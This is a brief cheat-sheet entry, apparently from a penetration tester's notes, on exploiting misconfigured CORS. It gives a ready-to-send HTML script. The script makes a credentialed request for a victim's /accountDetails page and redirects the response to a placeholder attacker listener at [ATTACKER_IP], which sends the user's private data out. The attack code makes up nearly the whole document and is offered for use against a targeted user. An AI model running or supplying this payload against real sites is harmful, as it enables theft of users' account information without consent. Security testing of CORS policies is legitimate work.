#cors

Send this to the targeted user to retrieve information only accessible by the user (in this example it is the `/accountDetails` page).

```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://[TARGET_IP]/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
      location='https://[ATTACKER_IP]/listener?c='+this.responseText
   };
</script>
```